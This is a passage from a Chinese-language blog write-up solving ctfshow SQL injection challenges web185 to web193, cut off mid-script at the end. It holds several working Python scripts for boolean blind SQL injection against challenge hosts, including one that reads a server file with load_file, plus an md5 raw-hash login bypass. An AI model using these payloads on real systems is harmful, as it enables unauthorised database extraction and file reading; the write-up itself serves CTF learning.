class="string">&quot;ctfshow_user group by pass having pass regexp(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(formatString(flag+x))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[**] &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#print(&quot;[--] &#123;&#125; is wrong&quot;.format(x))</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[flag]:&quot;</span>+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个是群主写的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-01-12 01:16:02</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-12 03:50:33</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 每秒发送不超过5个请求</span></span><br><span class="line"><span class="comment"># mysql 官方文档 https://dev.mysql.com/doc/refman/5.7/en/replication.html 5.7版本的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f279fb00-070d-4b47-a72f-0f1a82f2e84a.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">&quot;&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line"><span class="comment">#flagstr = &quot;&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">a = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">a += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x))</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;0x&quot;</span>+a.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#63746673686f777b</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">formatString</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line"></span><br><span class="line">temp = <span class="string">&quot;concat(&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">temp +=char2boolean(x)</span><br><span class="line"><span class="keyword">return</span> temp[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">char2boolean</span>(<span class="params">ch</span>):</span><br><span class="line">num = <span class="built_in">ord</span>(ch)</span><br><span class="line">temp = <span class="string">&quot;char(&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">temp +=<span class="string">&quot;true+&quot;</span></span><br><span class="line"><span class="keyword">return</span> temp[:-<span class="number">1</span>]+<span class="string">&quot;),&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;55eff0b8-fa84-4ee8-9cd2-4e84cdd78b73&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">flag=<span class="string">&quot;ctfshow&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass regexp(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(formatString(flag+x))</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url,data=data)</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line"><span class="keyword">if</span> response.text.find(<span class="string">&quot;user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++=&#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">flag+=x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++=&#123;&#125; is wrong&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++=&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20221229221701321.png" alt="image-20221229221701321"></p><p>代码中的char是负责转换字符用的，然后concat是连接字符用的。char转换里的内容是ascii的10进制。</p><h2 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h2><p>源码</p><p><img src="../images/image-20221229221947989.png" alt="image-20221229221947989"></p><p>这道题多过滤了&lt;&gt;  和x00  但是还是可以上一题的脚本来写。</p><p><img src="../images/image-20221229222842518.png" alt="image-20221229222842518"></p><h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>源码</p><p><img src="../images/image-20221229222936006.png" alt="image-20221229222936006"></p><p><img src="../images/image-20221229224301702.png" alt="image-20221229224301702"></p><p>以下内容摘自   <a href="https://blog.csdn.net/m0_48780534/article/details/126155600">https://blog.csdn.net/m0_48780534/article/details/126155600</a></p><p>​           本题和web181类似，都是通过<code>1 and 0 or 1</code>达到目的。</p><p>​         这里的二进制格式，并不是指转成0101，而是binary mode。</p><p><img src="../images/image-20221229224630236.png" alt="image-20221229224630236"></p><p><img src="../images/image-20221229224640893.png" alt="image-20221229224640893"></p><p>就是这样的格式。</p><p>那么这道题就得用到这个经过md5(<strong>ffifdyop</strong>)加密过后的东西，里面这段英文解析之后就是上图所示，和万能密码差不多。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from ctfshow_user where username = &#x27;admin&#x27; and password= &#x27;&#x27;or&#x27;6�]��!r,��b&#x27;;</span><br></pre></td></tr></table></figure><p>这个就会变成1 and 0 or 1   的情况，那么最后结果就是  1。</p><p><img src="../images/image-20221229225158366.png" alt="image-20221229225158366"></p><p><img src="../images/image-20221229225309316.png" alt="image-20221229225309316"></p><p>就是类似这种效果。只要第一个数字是数字不是字母就行。</p><p><img src="../images/image-20221229225514311.png" alt="image-20221229225514311"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count(*)  ----&gt;指的是数据库总行数</span><br></pre></td></tr></table></figure><h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><p>源码</p><p><img src="../images/image-20221229230058797.png" alt="image-20221229230058797"></p><p><strong>这里的考法是mysql的弱类型比较。</strong></p><p><img src="../images/image-20221229230659047.png" alt="image-20221229230659047"></p><p><img src="../images/image-20221229230716625.png" alt="image-20221229230716625"></p><p>这里能爆出来的原因是因为username的值没有用  ‘’   包含起来，那么username的值就为0，数据库中username是字母开头的话，值也为0.那么就可以把这些全部给爆出来了。</p><p><img src="../images/image-20221229230926512.png" alt="image-20221229230926512"></p><p>这个能爆出的原因是这个的username为1ab，转换过来的话值是为1的。那么就可以爆出值为1的password.</p><p><img src="../images/image-20221229231221101.png" alt="image-20221229231221101"></p><p>username和password都用0的原因是，两个if判断都为弱类型比较，<strong>0都会等于字母开头的字符串</strong></p><p>就是利用这一点，拿到了flag。</p><h2 id="web189-bool盲注"><a href="#web189-bool盲注" class="headerlink" title="web189(bool盲注)"></a>web189(bool盲注)</h2><p>源码</p><p><img src="../images/image-20221229231806534.png" alt="image-20221229231806534"></p><p>和上一题的内容一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag在api/index.php文件中     ----&gt;  给的提示</span><br></pre></td></tr></table></figure><p>看一下登录的返回情况有没有差别：<br>username=0、password=0时，返回“密码错误”。（说明存在用户，但是密码错误）<br>username=1、password=0时，返回“查询失败”。（说明用户不存在）</p><p>因为输入0  和 1返回的结果不同，加上过滤了联合注入需要的东西，那么我们就得考虑bool盲注的问题了。</p><p><strong>群主写的脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dc02940d-e22b-4796-ab0f-04bdf57d3a9f.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;&#125;&#123;&lt;&gt;$=,;_ &#x27;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#这个位置，是群主耗费很长时间跑出来的位置~</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>,<span class="number">257</span>+<span class="number">60</span>):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;username&quot;</span>:<span class="string">&quot;if(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)&quot;</span>.<span class="built_in">format</span>(i,x),</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">response = requests.post(url,data=data)</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line"><span class="keyword">if</span> response.text.find(<span class="string">&quot;8d25&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="comment">#8d25是username等于1时返回的东西，0返回时的东西不是8d25.</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">flag+=x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>data里的意思是，如果返回的值里的第n位与字符串里的某位相等，则返回1</p><p><img src="../images/image-20221230165849922.png" alt="image-20221230165849922"></p><h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><p>源码</p><p><img src="../images/image-20221230205113908.png" alt="image-20221230205113908"></p><p>这道题给了个提示说是bool盲注</p><p><img src="../images/image-20221230205237454.png" alt="image-20221230205237454"></p><p>提示密码错误。</p><p><img src="../images/image-20221230205303277.png" alt="image-20221230205303277"></p><p>输入别的提示用户名不存在，所以可以得出用户名处存在sql注入。这题没有过滤字符，那么直接用群主写的二分法脚本来跑就行了。(以后遇到bool盲注的题，可以修改脚本一下直接用就行了)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-12 05:48:30</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1429d815-6439-47de-ab04-5782a8bbf349.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">min</span> == mid):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and (ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;77de2af3-6f34-4d20-adc7-8aba40a40ffe&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h2><p>源码</p><p><img src="../images/image-20221230205641079.png" alt="image-20221230205641079"></p><p>这题相较上题而言，增加了过滤。但是影响不大，把web190的脚本拿来修改一下就好了。</p><p><img src="../images/image-20221230210418369.png" alt="image-20221230210418369"></p><p>这两个函数是一样的，可以替换着来用</p><p>修改后的wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-12 05:48:30</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://86c12830-4c24-41b4-bf71-64e3ad3646d1.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">min</span> == mid):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and (ord(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;77de2af3-6f34-4d20-adc7-8aba40a40ffe&#125;</span></span><br></pre></td></tr></table></figure><p>利用ord()来替换。</p><h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><p>源码</p><p><img src="../images/image-20221230212728629.png" alt="image-20221230212728629"></p><p>这里是把ord和ascii都给过滤掉了，那么我们就可以考虑不用编码成数字的形式来解题，可以直接遍历字符串来看是否相等。</p><p>群主写的wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-14 00:52:03</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://053d8c7a-d802-48ae-836c-d60f4a832555.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">&quot;&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;))#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#&#123;&#x27;username&#x27;: &quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),1,1)=&#x27;O&#x27;))#&quot;, &#x27;password&#x27;: 0&#125;</span></span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            flag += mid</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++++++&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;2bc86f71-2a58-45b2-8573-940ddffa99d2&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h2><p>源码</p><p><img src="../images/image-20221230214618742.png" alt="image-20221230214618742"></p><p>这次193是把substr给过滤掉了，那么我们就可以靠用别的函数来替代了。</p><p>left   right 这两个函数都可以。</p><p><img src="../images/image-20221230215436224.png" alt="image-20221230215436224"></p><p><img src="../images/image-20221230215458982.png" alt="image-20221230215458982"></p><p>群主写的wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-14 01:24:27</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://cd09c29e-5dfa-4740-aae6-babe6eebb972.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">&quot;,_&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line">tempstr = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> 